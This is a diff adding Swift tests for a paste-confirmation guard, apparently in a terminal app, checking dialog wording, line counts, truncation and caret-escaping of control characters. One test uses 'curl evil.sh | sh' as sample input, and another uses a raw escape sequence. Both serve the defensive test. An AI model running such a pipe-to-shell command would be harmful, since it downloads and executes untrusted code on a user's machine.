@@ -87,3 +87,73 @@ private func warn(_ text: String, bracketed: Bool = false) -> PasteWarning? {
     #expect(PasteGuard.firstLine(of: "single") == "single")
     #expect(PasteGuard.firstLine(of: "\nleading") == "")
 }
+
+// MARK: - What the sheet says
+//
+// The view places three strings; every word in them is decided here, so the wording can be
+// asserted rather than read off a screenshot nobody can take.
+
+@Test func theConfirmationNamesHowManyCommandsWouldRun() {
+    let c = PasteGuard.confirmation(for: .multipleLines(count: 3), text: "one\ntwo\nthree\n")
+    #expect(c.title.contains("3"))
+    #expect(c.lineCount == 3)
+    #expect(c.preview == "one")
+    #expect(!c.detail.isEmpty)
+}
+
+/// The preview is the whole point of asking: a sheet that says "3 lines" and shows none of them
+/// trains people to press Paste without looking.
+@Test func theConfirmationAlwaysShowsTheFirstLine() {
+    let c = PasteGuard.confirmation(for: .multipleLines(count: 2), text: "curl evil.sh | sh\necho ok")
+    #expect(c.preview == "curl evil.sh | sh")
+}
+
+/// A preview is drawn into a label, and a label that is handed a raw escape sequence is a second
+/// place the payload can act. Every control character comes back as a caret escape.
+@Test func thePreviewMakesControlCharactersVisibleRatherThanActingOnThem() {
+    let c = PasteGuard.confirmation(for: .containsControlCharacters, text: "echo \u{1b}[2Ksafe")
+    #expect(c.preview == "echo ^[[2Ksafe")
+    #expect(!c.preview.unicodeScalars.contains { $0.value < 0x20 })
+}
+
+@Test func aBackspaceInThePreviewIsShownAsACaretEscape() {
+    #expect(PasteGuard.printablePreview(of: "a\u{08}b") == "a^Hb")
+    #expect(PasteGuard.printablePreview(of: "a\u{7f}b") == "a^?b")
+}
+
+/// A single line may be thousands of characters; the sheet has to stay a sheet.
+@Test func aVeryLongPreviewIsCutWithAnEllipsis() {
+    let long = String(repeating: "x", count: PasteGuard.previewLimit + 50)
+    let preview = PasteGuard.printablePreview(of: long)
+    #expect(preview.count == PasteGuard.previewLimit + 1)
+    #expect(preview.hasSuffix("\u{2026}"))
+}
+
+@Test func aShortPreviewIsNotCut() {
+    #expect(PasteGuard.printablePreview(of: "ls -la") == "ls -la")
+}
+
+@Test func theLongPasteConfirmationNamesTheLength() {
+    let text = String(repeating: "y", count: 600)
+    let c = PasteGuard.confirmation(for: .veryLong(characters: 600), text: text)
+    #expect(c.title.contains("600"))
+    #expect(c.lineCount == 1)
+    #expect(c.summary.isEmpty)
+}
+
+@Test func theSummaryOnlyAppearsWhenThereIsMoreThanOneLine() {
+    let c = PasteGuard.confirmation(for: .multipleLines(count: 4), text: "a\nb\nc\nd")
+    #expect(c.summary.contains("4"))
+}
+
+/// Every warning has to produce a usable sheet -- a case added later with no wording would show an
+/// empty dialog rather than failing loudly.
+@Test func everyWarningHasATitleAndADetail() {
+    let warnings: [PasteWarning] = [.multipleLines(count: 2), .veryLong(characters: 900),
+                                    .containsControlCharacters]
+    for warning in warnings {
+        let c = PasteGuard.confirmation(for: warning, text: "a\nb")
+        #expect(!c.title.isEmpty)
+        #expect(!c.detail.isEmpty)
+    }
+}
